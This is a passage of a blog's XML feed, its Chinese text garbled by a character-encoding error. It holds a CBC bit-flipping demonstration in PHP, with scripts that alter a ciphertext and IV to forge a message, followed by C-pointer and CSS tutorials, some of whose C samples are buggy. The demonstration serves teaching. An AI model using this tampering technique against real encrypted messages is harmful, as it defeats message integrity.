$len;$i++)&#123;</span><br><span class="line">		<span class="comment">// å…ˆè¿›è¡Œè§£å¯†</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// å†å’Œä¸Šä¸€æ®µå¯†æ–‡åšå¼‚æˆ–è¿ç®—</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (substr($plain, <span class="number">0</span>, <span class="number">16</span>) !== <span class="string">"I               "</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"æ¶ˆæ¯è¢«ç¯¡æ”¹ï¼"</span> . base64_encode($plain) . <span class="string">"æ˜¯é”™è¯¯çš„ï¼"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$info[<span class="string">'iv'</span>] = $argv[<span class="number">1</span>];</span><br><span class="line">$info[<span class="string">'cipher'</span>] = $argv[<span class="number">2</span>];</span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é˜¿å¼ºç»™é˜¿çå‘äº†åŠ å¯†ä¿¡æ¯ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220711211953054.png" alt="image-20220711211953054"></p>
<p>å¦‚æœé˜¿çèƒ½å¤Ÿæ­£å¸¸æ¥å—ï¼Œè§£å¯†åï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220711212222566.png" alt="image-20220711212222566"></p>
<p>ä¸‹é¢è¿›è¡Œæ”»å‡»æ¨¡æ‹Ÿï¼š</p>
<p>å‡è®¾éš”å£è€ç‹è·æ‚‰äº†åŸå§‹çš„æ˜æ–‡ã€åˆå§‹å‘é‡å’Œå¯†æ–‡</p>
<p>è€ç‹æƒ³æŠŠæ¶ˆæ¯çš„ç¬¬äºŒæ®µæ”¹ä¸º<code>hate</code>ï¼Œä»–ç•¥åŠ æ€è€ƒï¼Œå†™ä¸‹äº†ä¸‹é¢çš„ç¯¡æ”¹è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_data.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$origin_cipher = base64_decode(<span class="string">"MmMvIWNOMmBoKx9kZ1web0kbTlNUeQVXXxwoU1BrKVh+dTYxbUA8bmYlEWppUhBh"</span>);</span><br><span class="line">$hack_msg = <span class="string">"hate            "</span>;</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// x = Plain[2][1] âŠ• cipher[1][1] âŠ• 'a'</span></span><br><span class="line">	$origin_cipher[$i] = chr(ord($plain[$i + <span class="number">16</span>])  ^ ord($origin_cipher[$i]) ^ ord($hack_msg[$i]));</span><br><span class="line">&#125;</span><br><span class="line">$new_cipher = base64_encode($origin_cipher);</span><br><span class="line"><span class="keyword">echo</span> $new_cipher;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»–å°†ä¿¡æ¯ç¯¡æ”¹å¥½ï¼Œç„¶åå‘ç»™é˜¿çï¼Œé˜¿çè§£æå‡ºæ¥åï¼Œæš—å·å¯¹ä¸ä¸Šï¼ˆç¬¬ä¸€æ®µæ˜æ–‡ä¸æ˜¯<code>I</code>ï¼‰ï¼Œå¹¶å°†é”™è¯¯ä¿¡æ¯å‘å‡ºæ¥ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220711144007390.png" alt="image-20220711144007390"></p>
<p>å¯ä»¥çœ‹å¾—åˆ°ï¼Œè€ç‹æˆåŠŸåœ°å°†ç¬¬äºŒæ®µæ˜æ–‡ä¿®æ”¹å¥½äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å°†<code>iv</code>ä¿®æ”¹å¥½ã€‚</p>
<p>è€å¤–ç•¥åŠ æ€ç´¢ï¼Œç«‹åˆ»å†™å‡ºæ¥æ¢å¤<code>iv</code>çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_iv.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line">$plain_erro = base64_decode(<span class="string">"TS4iICAgICAgICAgICAgIGhhdGUgICAgICAgICAgICAgeW91Li4uLi4uLi4uLi4u"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// iv_new = plain âŠ• plain_erro âŠ• iv_old</span></span><br><span class="line">	$origin_iv[$i] = chr(ord($plain[$i]) ^ ord($plain_erro[$i]) ^ ord($origin_iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($origin_iv);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220711224840348.png" alt="image-20220711224840348"></p>
<p>é˜¿çç«‹å³æ”¶åˆ°é”™è¯¯çš„æ¶ˆæ¯ï¼Œè€ç‹æˆåŠŸæ£’æ‰“é¸³é¸¯ï¼ğŸ™ƒ</p>
<hr>
<p>ä»è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å­¦ä¼šäº†å–œæ¬¢ä¸€ä¸ªäººçš„æ—¶å€™ï¼Œè¦å¤§èƒ†åœ°é¢å¯¹é¢è¯´å‡ºæ¥ï¼Œä¸è¦æ•´è¿™äº›èŠ±é‡Œèƒ¡å“¨çš„çš„æš—ç¤ºã€‚ğŸ˜</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>Cè¯­è¨€çš„æŒ‡é’ˆ</title>
    <url>/2020/06/29/C%E8%AF%AD%E8%A8%80%E7%9A%84%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h2 id="æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’"><a href="#æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’" class="headerlink" title="æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’"></a>æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’</h2><p>Cè¯­è¨€ä¸­ï¼Œå½“æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°è¿›è¡Œä¼ é€’æ—¶ï¼Œå®é™…ä¸Šå½¢å‚å’Œå®å‚æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°æ–¹ï¼Œä¾‹å¦‚ï¼š<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 08:59:40</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"=== test p1 = %p ====\n"</span>, p1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"=== main p = %p ====\n"</span>, p);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºçš„æ˜¯ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">=== main p = <span class="number">0000000000000010</span> ====</span><br><span class="line">=== test p1 = <span class="number">0000000000000010</span> ====</span><br></pre></td></tr></table></figure>

<p>å¯è§äºŒè€…çš„åœ°å€æ˜¯ç›¸åŒçš„ã€‚</p>
<p>æ‰€ä»¥å½¢å‚å¯¹å…¶æŒ‡å‘çš„å†…å­˜åŒºåŸŸè¿›è¡Œä¿®æ”¹ï¼Œä¹Ÿä¼šå½±å“åˆ°å®å‚æŒ‡å‘çš„å†…å­˜åŒºåŸŸï¼Œå› ä¸ºäºŒè€…æŒ‡å‘çš„åŒºåŸŸæ˜¯åŒä¸€ä¸ªä½ç½®ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:08:30</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> *p1)</span> </span>&#123; *p1 = <span class="number">2</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *p = &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"before a = %d\n"</span>, a);</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after a = %d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºçš„æ˜¯ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">before a = <span class="number">1</span></span><br><span class="line">after a = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-19 18:02:53</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-06-29 09:16:55</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\some_test\pointTest-copy.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆå®¹æ˜“è®©äººä»¥ä¸ºè¾“å‡ºçš„æ˜¯</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å®é™…ä¸Šè¾“å‡ºçš„æ˜¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>

<p>ä¸‹å›¾ç»™å‡ºè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒæŒ‡é’ˆçš„å˜åŒ–ï¼š</p>
<p><img src="https://q.yalexin.top/1.png" alt="1"></p>
<p>å®é™…ä¸Šæ˜¯å› ä¸ºå½¢å‚æŒ‡å‘çš„åŒºåŸŸå·²ç»ä¸å®å‚æŒ‡å‘çš„ä¸ä¸€è‡´ã€‚</p>
<p>ä½†æ˜¯å‡å¦‚æœ‰åœ¨è¢«è°ƒå‡½æ•°æ”¹å˜å®å‚çš„åœ°å€çš„éœ€æ±‚æ€ä¹ˆåŠï¼Ÿ</p>
<p>ä¸¤ç§æ–¹æ³•ï¼š</p>
<ol>
<li><p>è¢«è°ƒå‡½æ•°è¿”å›æŒ‡é’ˆï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123; p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä½¿ç”¨è¯¥æ–¹æ³•çš„æ—¶å€™ï¼Œä¸æ¨èè¿”å›å±€éƒ¨æŒ‡é’ˆï¼Œè¿”å›å±€éƒ¨æŒ‡é’ˆå¾ˆå®¹æ˜“å‡ºç°é”™è¯¯ï¼Œè¯¦è§<a href="https://www.cnblogs.com/qinguoyi/p/10154804.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a></p>
<p>ä¸‹é¢çš„ä¾‹å­å°±æ˜¯å­˜åœ¨é—®é¢˜ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">char</span> *p1)</span> </span>&#123;</span><br><span class="line">    p1 = <span class="string">"modified"</span>;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>] = <span class="string">""</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">"yalexin %s"</span>, p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span>,str);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    p = test(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºçš„æ˜¯ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">str = yalexin modified</span><br><span class="line">after p = (null)</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨äºŒçº§æŒ‡é’ˆï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> **p1)</span> </span>&#123; *p1 = <span class="string">"modified"</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è°ƒç”¨å‡½æ•°ä¹‹å‰pçš„åœ°å€æ˜¯ %p\n"</span>, p);</span><br><span class="line">    test(&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è°ƒç”¨å‡½æ•°ä¹‹åpçš„åœ°å€æ˜¯ %p\n"</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"after p = %s\n"</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">è°ƒç”¨å‡½æ•°ä¹‹å‰pçš„åœ°å€æ˜¯ <span class="number">0000000000000000</span></span><br><span class="line">è°ƒç”¨å‡½æ•°ä¹‹åpçš„åœ°å€æ˜¯ <span class="number">0000000000404000</span></span><br><span class="line">after p = modified</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ol>
<li>å½“æŒ‡é’ˆæŒ‡å‘çš„æ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¾‹å¦‚<code>*int* *p = &amp;a;</code>ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨<code>free(p)</code>è¿›è¡Œé‡Šæ”¾èµ„æºï¼Œ <code>free()</code> åªæ˜¯é’ˆå¯¹ä½¿ç”¨äº† <code>malloc()</code>ï¼Œ <code>realloc()</code>å‡½æ•°è¿›è¡Œç”³è¯·çš„å†…å­˜è¿›è¡Œé‡Šæ”¾ã€‚ </li>
<li>ä½¿ç”¨<code>free()</code>åï¼Œç›¸åº”çš„æŒ‡é’ˆå°±ä¼šå˜ä¸ºâ€œé‡æŒ‡é’ˆâ€ï¼Œå¦‚æœå¯¹é‡æŒ‡é’ˆè¿›è¡Œå¼•ç”¨ï¼Œä¼šé€ æˆä¸å¯é¢„æœŸçš„åæœï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨<code>free(p)</code>åï¼Œä¸€èˆ¬ç´§æ¥ç€<code>p = NULL</code></li>
</ol>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS è¯­æ³•äºŒ</title>
    <url>/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="æ–‡æœ¬ä¿®é¥°ç±»å‹CSS"><a href="#æ–‡æœ¬ä¿®é¥°ç±»å‹CSS" class="headerlink" title="æ–‡æœ¬ä¿®é¥°ç±»å‹CSS"></a>æ–‡æœ¬ä¿®é¥°ç±»å‹CSS</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.class_test</span> &#123;</span><br><span class="line">    <span class="comment">/* å¯¹é½æ–¹å¼ */</span></span><br><span class="line">	<span class="attribute">text-align</span>: left;</span><br><span class="line">	<span class="comment">/* è¡Œé«˜ */</span></span><br><span class="line">	<span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">	<span class="comment">/* å­—æ¯é—´è· */</span></span><br><span class="line">	<span class="attribute">letter-spacing</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* å•è¯é—´è· å¯¹ä¸­æ–‡æ— æ•ˆ*/</span></span><br><span class="line">	<span class="attribute">word-spacing</span>: <span class="number">30px</span>;</span><br><span class="line">	<span class="comment">/* æ–‡æœ¬ä¿®é¥° å¦‚åŠ ä¸‹åˆ’çº¿ç­‰ */</span></span><br><span class="line">	<span class="attribute">text-decoration</span>: underline;</span><br><span class="line">	<span class="comment">/* é¦–è¡Œç¼©è¿› */</span></span><br><span class="line">	<span class="attribute">text-indent</span>: <span class="number">2em</span>;</span><br><span class="line">	<span class="comment">/* æ–‡æœ¬å¤§å°å†™è½¬æ¢ capitalizeæ˜¯é¦–å­—æ¯è‡ªåŠ¨å¤§å†™ */</span></span><br><span class="line">	<span class="attribute">text-transform</span>: capitalize;</span><br><span class="line">	<span class="comment">/* å­—ä½“æ ·å¼ */</span></span><br><span class="line">	<span class="attribute">font-family</span>: å¾®è½¯é›…é»‘;</span><br><span class="line">	<span class="comment">/* å­—ä½“å¤§å° */</span></span><br><span class="line">	<span class="attribute">font-size</span>: <span class="number">5px</span>;</span><br><span class="line">	<span class="comment">/* å­—ä½“ç²—ç»† */</span></span><br><span class="line">	<span class="attribute">font-weight</span>: <span class="number">100px</span>;</span><br><span class="line">	<span class="comment">/* å­—ä½“é˜´å½± */</span></span><br><span class="line">	<span class="comment">/* æŒ‰ç…§é¡ºåºæ˜¯æ°´å¹³æ–¹å‘çš„åç§»ï¼Œç«–ç›´æ–¹å‘çš„ä¾¿å®œï¼Œæ¨¡ç³Šç¨‹åº¦ï¼ˆä¸å€¼æˆæ­£æ¯”ï¼‰é˜´å½±é¢œè‰² */</span></span><br><span class="line">	<span class="attribute">text-shadow</span>: <span class="number">5px</span> <span class="number">100px</span> <span class="number">5px</span> blueviolet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="CSSåŠ¨ç”»"><a href="#CSSåŠ¨ç”»" class="headerlink" title="CSSåŠ¨ç”»"></a>CSSåŠ¨ç”»</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* é¼ æ ‡ç»è¿‡çš„æ—¶å€™ */</span></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">color</span>: blueviolet;</span><br><span class="line">        <span class="attribute">background-color</span>: brown;</span><br><span class="line">        <span class="comment">/* è§¦å‘åŠ¨ç”»å»¶è¿Ÿæ—¶é—´ */</span></span><br><span class="line">        <span class="attribute">transition-delay</span>: <span class="number">200ms</span>;</span><br><span class="line">        <span class="comment">/* å®Œæˆä¸€æ¬¡åŠ¨ç”»æ‰€éœ€æ—¶é—´ */</span></span><br><span class="line">        <span class="attribute">transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* è™½ç„¶è¯´ä¸Šé¢çš„æ˜¯ä¸€ä¸ªé€šç”¨çš„å†™æ³•ï¼Œä½†æ˜¯ä»¥é˜²ä¸‡ä¸€è¿˜æ˜¯å°½å¯èƒ½å¤šåœ°è¦†ç›–å„ç§å†…æ ¸ */</span></span><br><span class="line">        <span class="attribute">-webkit-transition-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* é€‰æ‹©è¦è¿‡æ¸¡çš„å±æ€§ï¼Œé»˜è®¤æ˜¯all */</span></span><br><span class="line">        <span class="attribute">transition-property</span>: height,background;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦æ›´åŠ å¤æ‚çš„åŠ¨ç”»ï¼Œå°±è¦é…åˆ@keyframesæ¥ä½¿ç”¨</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">p</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: black;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">        <span class="attribute">animation-name</span>: test_animation;</span><br><span class="line">        <span class="attribute">animation-duration</span>: <span class="number">500ms</span>;</span><br><span class="line">        <span class="comment">/* å¾ªç¯åŠ¨ç”»çš„æ¬¡æ•° */</span></span><br><span class="line">        <span class="attribute">animation-iteration-count</span>: <span class="number">5</span>;</span><br><span class="line">        <span class="comment">/* è½®æµåå‘æ’­æ”¾åŠ¨ç”» */</span></span><br><span class="line">        <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@keyframes</span> test_animation &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* fromç›¸å½“äº0% */</span></span><br><span class="line">        <span class="selector-tag">from</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* åœ¨è¿™é‡Œè¾“å…¥0%åˆ°100%çš„æœ‰æ•ˆå€¼ */</span></span><br><span class="line">        50% &#123;</span><br><span class="line">            <span class="attribute">background-color</span>: blue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* toç›¸å½“äº100% */</span></span><br><span class="line">        <span class="selector-tag">to</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span 